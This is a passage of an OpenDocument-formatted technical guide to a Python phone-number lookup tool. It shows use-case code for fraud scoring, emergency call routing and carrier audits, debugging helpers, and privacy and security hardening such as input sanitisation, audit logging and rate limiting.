      <text:p text:style-name="P27"><text:s text:c="4"/>phone_info = tracker.track(order.phone_number)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>risk_score = 0</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Check if phone country matches shipping country</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if phone_info.country_name != order.shipping_country:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>risk_score += 30</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>logger.warning(f"Country mismatch: phone={phone_info.country_name}, shipping={order.shipping_country}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Check if carrier is known prepaid (higher risk)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>high_risk_carriers = ['virtual', 'prepaid', 'mvno']</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if phone_info.carrier_name and any(c in phone_info.carrier_name.lower() for c in high_risk_carriers):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>risk_score += 20</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Check if location matches IP geolocation</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>ip_country = geolocate_ip(order.ip_address)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if phone_info.country_name != ip_country:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>risk_score += 15</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>return {</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>'risk_score': risk_score,</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>'high_risk': risk_score &gt; 50,</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>'phone_info': phone_info.to_dict()</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P4"><text:soft-page-break/>6.2 Emergency Services Routing</text:p>
      <text:p text:style-name="Preformatted_20_Text">A Tanzanian emergency response system uses prefix-based routing:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P27">def route_emergency_call(phone_number):</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""Route emergency call to appropriate local dispatch."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>info = tracker.track(phone_number)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Extract region from location</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>location = info.location or info.country_name</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Map to dispatch center</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>dispatch_centers = {</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"Dar es Salaam": "disp-01.dar.esb",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"Arusha": "disp-02.arusha.esb",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"Mwanza": "disp-03.mwanza.esb",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"Zanzibar": "disp-04.zanzibar.esb",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"DEFAULT": "disp-00.national.esb"</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Find closest match</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>center = dispatch_centers.get(location)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if not center:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Try partial matching</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>for key, value in dispatch_centers.items():</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>if key in location:</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>center = value</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>break</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>return {</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>'dispatch_center': center or dispatch_centers['DEFAULT'],</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>'phone_info': info.to_dict()</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P4">6.3 Telecommunications Regulatory Compliance</text:p>
      <text:p text:style-name="Preformatted_20_Text">A regulatory body audits carrier allocations:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P27">def audit_carrier_allocations():</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""Verify carriers are using allocated prefixes correctly."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Official allocations from TCRA</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>official = {</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>'74': 'Vodacom',</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>'75': 'Vodacom',</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>'76': 'Vodacom',</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>'68': 'Airtel',</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>'69': 'Airtel',</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>'78': 'Airtel',</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>'65': 'tiGO',</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>'67': 'tiGO',</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>'71': 'tiGO',</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>'77': 'tiGO',</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>'61': 'halotel',</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>'62': 'halotel',</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>'73': 'TTCL',</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Sample numbers from each prefix</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>test_numbers = [f"+255{prefix}0000001" for prefix in official.keys()]</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="4"/>results = {}</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>for number in test_numbers:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>info = tracker.track(number)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>prefix = number[5:7] <text:s/># Extract prefix</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>results[prefix] = {</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'detected': info.carrier_name,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'official': official.get(prefix),</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'match': info.carrier_name == official.get(prefix)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>return results</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P7">7. Common Errors and Debugging</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">7.1 Error:</text:span> "Invalid phone number format"</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Cause: The phone number doesn't match international format requirements.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Solution:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P27">def debug_invalid_number(number):</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""Diagnose why a number is invalid."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>import phonenumbers</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Step 1: Check for obvious formatting issues</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print(f"Raw input: '{number}'")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print(f"Contains only digits and +: {all(c.isdigit() or c == '+' for c in number)}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print(f"Starts with +: {number.startswith('+')}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Step 2: Try parsing with different countries</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>for country in ['TZ', 'US', 'GB']:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>try:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>parsed = phonenumbers.parse(number, country)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>print(f"Parsed with {country}: {phonenumbers.is_valid_number(parsed)}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>except Exception as e:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>print(f"Parse with {country} failed: {e}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Step 3: Check length</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>digits = ''.join(c for c in number if c.isdigit())</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print(f"Digits only: {digits}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print(f"Length: {len(digits)} digits (should be 7-15 for valid numbers)")</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">7.2 Error: "Service Error" for geocoding</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text">Cause: Nominatim API rate limiting or network issues.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Solution: Implement exponential backoff and fallback:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P27">import time</text:p>
      <text:p text:style-name="P27">import random</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">def geocode_with_retry(location, max_retries=5):</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""Geocode with exponential backoff."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>from geopy.geocoders import Nominatim</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>from geopy.exc import GeocoderTimedOut, GeocoderServiceError</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>geolocator = Nominatim(user_agent="j_phone_notracker")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>for attempt in range(max_retries):</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="8"/>try:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/># Add jitter to avoid thundering herd</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>time.sleep(random.uniform(0.1, 0.5) * (2 ** attempt))</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>result = geolocator.geocode(location, timeout=5)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>if result:</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>return (result.latitude, result.longitude)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>except GeocoderTimedOut:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>logger.warning(f"Geocoder timeout (attempt {attempt+1})")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>except GeocoderServiceError as e:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>logger.error(f"Geocoder service error: {e}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>break <text:s/># Don't retry on service errors</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>except Exception as e:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>logger.error(f"Unexpected error: {e}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Fallback to local database</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>from src.data.city_centers import CITY_CENTERS</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>return CITY_CENTERS.get(location)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">7.3 Error: Missing Carrier Information</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Cause: Number portability or incomplete database.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Explanation: The phonenumbers library only returns the original carrier assigned to that prefix, not the current carrier after number portability .</text:p>
      <text:p text:style-name="Preformatted_20_Text">Solution: Add warning to user:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P27">def get_carrier_with_disclaimer(parsed_number):</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""Get carrier with disclaimer about number portability."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>carrier_name = carrier.name_for_number(parsed_number, "en")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if carrier_name:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return {</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'name': carrier_name,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'note': "This is the original carrier for this prefix. "</text:p>
      <text:p text:style-name="P27"><text:s text:c="20"/>"Due to number portability, the current carrier may differ."</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>else:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return {</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'name': None,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'note': "Carrier information not available for this number."</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">7.4 Debugging Checklist</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">When the application fails, use this systematic approach:</text:p>
      <text:p text:style-name="P27">def debug_tracking_failure(phone):</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""Comprehensive debugging for tracking failures."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print(f"=== Debugging tracking for {phone} ===\n")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># 1. Basic validation</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>from src.utils.validators import validate_phone_number</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>valid = validate_phone_number(phone)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print(f"✓ Basic validation: {'PASS' if valid else 'FAIL'}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># 2. Parse with phonenumbers</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>import phonenumbers</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>try:</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="8"/>parsed = phonenumbers.parse(phone, None)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print(f"✓ Parse successful: country_code={parsed.country_code}, national={parsed.national_number}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>except Exception as e:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print(f"✗ Parse failed: {e}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="3"/><text:span text:style-name="T6"><text:s/># 3. Check validity</text:span></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>valid = phonenumbers.is_valid_number(parsed)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print(f"✓ Number validity: {'VALID' if valid else 'INVALID'}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if not valid:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>possible = phonenumbers.is_possible_number(parsed)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print(f" <text:s/>Possible number: {possible}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># 4. Get location</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>location = phonenumbers.geocoder.description_for_number(parsed, "en")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print(f"✓ Location: {location or 'Not available'}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># 5. Get carrier</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>carrier_name = phonenumbers.carrier.name_for_number(parsed, "en")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print(f"✓ Carrier: {carrier_name or 'Not available'}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># 6. Get timezone</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>tz = phonenumbers.timezone.time_zones_for_number(parsed)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print(f"✓ Timezone: {tz or 'Not available'}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># 7. Test geocoding</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if location:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>from src.core.geocoder import get_coordinates_from_location</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>coords = get_coordinates_from_location(location)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if coords:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>print(f"✓ Coordinates: {coords[0]:.4f}, {coords[1]:.4f}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>else:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>print(f"✗ Geocoding failed for '{location}'")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print("\n=== Debug complete ===")</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P37">8. Security Considerations</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">8.1 Privacy Risks and Ethical Use</text:p>
      <text:p text:style-name="Preformatted_20_Text">Critical Warning: J Phone NoTracker can be misused for stalking, harassment, or privacy violations. The creators explicitly state: "This tool is for educational and legitimate purposes only. Always respect privacy laws and regulations when using phone number tracking capabilities" .</text:p>
      <text:p text:style-name="Preformatted_20_Text">Legal Framework in Tanzania:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Personal Data Protection Act, 2022: Regulates collection and processing of personal data</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Electronic and Postal Communications Act: Governs telecommunications data</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Cybercrimes Act, 2015: Criminalizes unauthorized access to computer systems and data</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">8.2 Security Hardening for Production</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P27"># Security configuration</text:p>
      <text:p text:style-name="P27">class SecurityConfig:</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Rate limiting to prevent abuse</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>RATE_LIMIT = "100 per hour per IP"</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="4"/># API key protection</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>API_KEYS = {</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>'nominatim': os.getenv('NOMINATIM_API_KEY'),</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>'google_maps': os.getenv('GOOGLE_MAPS_API_KEY'),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Logging sensitivity</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>LOG_SENSITIVE_DATA = False <text:s/># Don't log phone numbers</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Data retention</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>RETENTION_DAYS = 30 <text:s/># Automatically delete history after 30 days</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Access control</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>REQUIRE_AUTH = True</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>JWT_SECRET = os.getenv('JWT_SECRET')</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Encryption at rest</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>ENCRYPT_HISTORY = True</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY')</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P4">8.3 Input Sanitization and Injection Prevention</text:p>
      <text:p text:style-name="P27">import re</text:p>
      <text:p text:style-name="P27">import html</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">def sanitize_input(user_input):</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>Sanitize user input to prevent injection attacks.</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Remove any HTML/script tags</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>clean = html.escape(user_input)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Allow only international phone number characters</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>clean = re.sub(r'[^\d+]', '', clean)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Ensure proper format</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if not clean.startswith('+'):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>clean = '+' + clean</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Limit length (max international numbers are 15 digits + '+')</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if len(clean) &gt; 16:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>clean = clean[:16]</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>return clean</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P4">8.4 Audit Logging for Compliance</text:p>
      <text:p text:style-name="P27">import logging</text:p>
      <text:p text:style-name="P27">import json</text:p>
      <text:p text:style-name="P27">from datetime import datetime</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">class AuditLogger:</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""Audit logging for compliance and investigation."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def __init__(self, log_path="audit.log"):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.logger = logging.getLogger('audit')</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>handler = logging.FileHandler(log_path)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>handler.setFormatter(logging.Formatter(</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'%(asctime)s - %(message)s'</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>))</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.logger.addHandler(handler)</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="8"/>self.logger.setLevel(logging.INFO)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def log_lookup(self, user_id, phone_number, result, ip_address):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Log a phone number lookup for audit purposes."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Mask phone number for privacy in logs</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>masked = phone_number[:5] + '*' * (len(phone_number) - 8) + phone_number[-3:]</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>audit_entry = {</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'timestamp': datetime.now().isoformat(),</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'user_id': user_id,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'phone_masked': masked,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'ip_address': ip_address,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'result_summary': {</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>'valid': result.valid,</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>'country': result.country_name,</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>'carrier': result.carrier_name</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>}</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.logger.info(json.dumps(audit_entry))</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def log_error(self, user_id, phone_number, error, ip_address):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Log errors for security monitoring."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>audit_entry = {</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'timestamp': datetime.now().isoformat(),</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'user_id': user_id,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'phone': phone_number,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'error': str(error),</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'ip_address': ip_address,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'type': 'ERROR'</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.logger.warning(json.dumps(audit_entry))</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P4">8.5 Rate Limiting Implementation</text:p>
      <text:p text:style-name="P27">from collections import defaultdict</text:p>
      <text:p text:style-name="P27">import time</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">class RateLimiter:</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""Simple rate limiter to prevent abuse."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def __init__(self, max_requests=100, window_seconds=3600):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.max_requests = max_requests</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.window_seconds = window_seconds</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.requests = defaultdict(list)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def is_allowed(self, client_id):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Check if client is within rate limits."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>now = time.time()</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>window_start = now - self.window_seconds</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Clean old requests</text:p>
